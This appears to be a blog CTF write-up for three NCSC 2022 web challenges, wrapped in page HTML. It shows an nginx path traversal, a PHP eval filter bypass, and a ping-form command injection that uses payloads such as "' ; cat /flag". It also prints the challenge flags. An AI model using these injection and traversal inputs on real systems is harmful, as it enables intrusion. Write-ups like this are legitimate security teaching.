@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    
+      <title>
+        NCSC 2022 - Writeup ::
+        j3seer
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Our team got 5th
+Solved Web challenges
+Team score : #   Welcome to Web Universe #  Let&amp;rsquo;s warmup a little bit now with some cool stuffs! Web is really always the best!!
+Link: http://20.119.58.135:4567/leetstatus
+Author: Kahla
+At first i didn&amp;rsquo;t know where to go and how to try to solve this i tried to check for robots.txt or index.php or index.html .. couldn&amp;rsquo;t find anything until i checked the source code that was provided"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://j3seer.github.io/posts/ncsc_2022_writeup/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://j3seer.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://j3seer.github.io/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://j3seer.github.io/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://j3seer.github.io/img/favicon.png" />
+
+
+<link href="https://j3seer.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="NCSC 2022 - Writeup"/>
+<meta name="twitter:description" content="Writeup for challenges in the National Cyber Security Congress(NCSC) CTF by @Securinets "/>
+
+
+
+<meta property="og:title" content="NCSC 2022 - Writeup" />
+<meta property="og:description" content="Writeup for challenges in the National Cyber Security Congress(NCSC) CTF by @Securinets " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://j3seer.github.io/posts/ncsc_2022_writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-02-13T00:00:00+00:00" />
+
+
+
+
+
+
+
+  </head>
+  
+  <body >
+
+    
+
+    <div class="container">
+      <header class="header">
+  
+
+  <span class="header__inner">
+    <a
+  href="https://j3seer.github.io"
+  class="logo"
+  style="text-decoration: none;"
+>
+ 
+   
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">j3seer</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+        
+          <li><a href="/posts">posts</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/whoami">whoami</a></li>
+      
+    
+      
+        <li><a href="/posts">posts</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+      
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">NCSC 2022 - Writeup</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-02-13
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://j3seer.github.io/tags/php/">#php</a>&nbsp;
+        
+          <a href="https://j3seer.github.io/tags/nginx/">#nginx</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Our team got 5th</p>
+<p>Solved Web challenges</p>
+<h2 id="team-score-">
+  Team score :
+  <a href="#team-score-" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p><img src="https://user-images.githubusercontent.com/58823465/151805184-05292ad7-6630-4776-8fe5-2826ecf90ee1.png" alt="task_hashed"></p>
+<hr>
+<h1 id="welcome-to-web-universe">
+  Welcome to Web Universe
+  <a href="#welcome-to-web-universe" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>Let&rsquo;s warmup a little bit now with some cool stuffs! Web is really always the best!!</p>
+<p>Link: http://20.119.58.135:4567/leetstatus</p>
+<p><strong>Author: Kahla</strong></p>
+<p><img src="https://user-images.githubusercontent.com/58823465/151862530-52d045f4-912a-4ade-8e36-c3651dfd416e.png" alt="c"></p>
+<p>At first i didn&rsquo;t know where to go and how to try to solve this
+i tried to check for robots.txt or index.php or index.html .. couldn&rsquo;t find anything until i checked the source code that was provided</p>
+<p>it seems like the website is running using nginx !</p>
+<p>looking into <code>main.py</code> we see this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+<span style="color:#f92672">import</span> os
+
+flag<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
+app <span style="color:#f92672">=</span> Flask(__name__, static_url_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/static/&#39;</span>)
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/v1/status&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Everything is good afaik&#34;</span>
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/flag&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flag</span>():
+	<span style="color:#66d9ef">return</span> flag
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+	app<span style="color:#f92672">.</span>run()
+</code></pre></div><p>nginx config file :</p>
+<pre tabindex="0"><code>server {
+listen 80;
+server_name welcome.task;
+
+location /leet {
+  proxy_pass http://api:5000/v1/;
+}
+
+access_log off;
+error_log /var/log/nginx/error.log error;
+}
+</code></pre><p>From this we can conclude that the <code>&quot;leet&quot;</code> part is like a prefix for the other webpages
+After few googling i figured that we can try to find the path to /flag
+===&gt; path traversal !!</p>
+<p>and this is possible because of the misconfiguration of nginx</p>
+<p>you can read more about this here :</p>
+<p><a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/</a></p>
+<p>finally we find the path to be ../flag</p>
+<p>Path : <code>http://x.x.x.x/leet../flag</code></p>
+<p>and we get our flag :</p>
+<p><code>Securinets{Nginx_Is_NoT_ThaT_GooD_AftER_All}</code></p>
+<hr>
+<h1 id="peehpee">
+  PeeHpee
+  <a href="#peehpee" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>Dali likes PhP because it&rsquo;s weird and has a lot of bugs. Is that really true ?
+Link: http://20.119.58.135:1234</p>
+<p><strong>Author: Kahla</strong></p>
+<p>we were provided this php source code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#75715e">//Show Page code source
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+<span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#34;secret.php&#34;</span>;
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;__&#34;</span>])<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;_&#34;</span>])){
+$x<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#34;__&#34;</span>];
+$inp<span style="color:#f92672">=</span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/[^A-Za-z0-9$]/&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$_GET[<span style="color:#e6db74">&#34;_&#34;</span>]);
+<span style="color:#66d9ef">if</span>($inp<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;Kahla&#34;</span>){
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Hacking Attempt detected&#34;</span>);
+}
+<span style="color:#66d9ef">else</span>{
+    <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;return </span><span style="color:#e6db74">$inp</span><span style="color:#e6db74">=&#34;</span><span style="color:#f92672">.</span>$inp<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;;&#34;</span>)<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;Kahla&#34;</span>){
+        <span style="color:#66d9ef">echo</span> $flag;
+    }
+    <span style="color:#66d9ef">else</span>{
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Pretty Close maybe ?&#34;</span>);
+    }
+}
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>trying to send <strong>&ldquo;Kahla&rdquo;</strong> in the <strong>_</strong> param prints out this prompt</p>
+<p>Payload : <code>http://20.119.58.135:1234/?__=&amp;_=Kahla</code></p>
+<p>Output :</p>
+<p><img src="https://user-images.githubusercontent.com/58823465/151814781-7f079c2b-0cf4-42eb-8a71-250713e79fca.png" alt="a"></p>
+<p>We notice that we have the other <code>__</code> param too that we haven&rsquo;t tried to use yet
+and it seems sorta useless but its there soo we might as well just use it right?</p>
+<p>So we know that the code is filtering the word <strong>Kahla</strong> and won&rsquo;t allow us to get the flag with it</p>
+<p>So how about we use the <code>__</code> to send it to the <code>_</code> param? since it&rsquo;s not verifying that param</p>
+<p>Payload : <code>http://20.119.58.135:1234/?__=Kahla&amp;_=$_GET[__]</code></p>
+<p>Output : <img src="https://user-images.githubusercontent.com/58823465/151814811-b5b61141-c69c-47ba-a3dd-73827772fffc.png" alt="6"></p>
+<p>well i guess we&rsquo;re pretty close :/ ?
+We can&rsquo;t use the <strong>GET</strong> to send the param because the regex won&rsquo;t allow the [] characters
+But notice that we have a <code>$x</code> variable in the source code that takes the <code>__</code> value !!</p>
+<p>All we need to do is just to pass that through the <code>_</code> param</p>
+<p>Payload : <code>http://20.119.58.135:1234/?__=Kahla&amp;_=$x</code></p>
+<p>Output : <code>Securinets{PeehPee_1s_AlWAYs_H3r3}</code></p>
+<p>And there&rsquo;s our flag!</p>
+<hr>
+<h1 id="broken-pinggyy">
+  Broken Pinggyy
+  <a href="#broken-pinggyy" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>I&rsquo;ve developed a simple web app to ping any IP/domain but i had some problems in my code .. I&rsquo;m a newbie web developer so i&rsquo;ll give the source code to help me. flag location =&gt; /flag Link: http://20.119.58.135:789/</p>
+<p><strong>Author: MONT4</strong></p>
+<p>We were presented by this webpage that allows us to ping other webpages but
+the website seems like its not working</p>
+<p><img src="https://user-images.githubusercontent.com/58823465/151815537-56958a35-7b1c-43a9-9c9b-9228a8364c00.png" alt="3"></p>
+<p>I tried to get command injection using just <code>ls</code> or <code>; ls</code>  but nothing works</p>
+<p>Looking through the provided source code we can see that there&rsquo;s a typo in the ping command</p>
+<p>Notice the <code>'</code> before <code>ping</code></p>
+<p><img src="https://user-images.githubusercontent.com/58823465/151815670-63d7d1e3-8365-4d4b-99ab-702601011a64.png" alt="image"></p>
+<p>so now we just need to add a <code>'</code> before anything we type and we have to add <code>;</code> to close out the first command
+so our payload becomes</p>
+<p><code>' ; ls</code></p>
+<p><img src="https://user-images.githubusercontent.com/58823465/151815731-b4e9f0a4-02c3-47fe-8c8a-f56aa89002c3.png" alt="image"></p>
+<p>but we still don&rsquo;t get anything ! well that&rsquo;s because the flag is at /flag so we just need to <strong>cat</strong> that</p>
+<p>Payload becomes :</p>
+<p><code>' ; cat /flag</code></p>
+<p><img src="https://user-images.githubusercontent.com/58823465/151815784-28939afe-9880-4945-a4dc-a28a1fd65335.png" alt="image"></p>
+<p>there&rsquo;s our flag :</p>
+<p><code>Securinets{Be_c4refuL_fr0m_C0mmand_1njection!!}</code></p>
+
+    </div>
+    
+
+    
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="https://j3seer.github.io"
+  class="logo"
+  style="text-decoration: none;"
+>
+ 
+   
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">j3seer</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023</span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://j3seer.github.io/assets/main.js"></script>
+<script src="https://j3seer.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
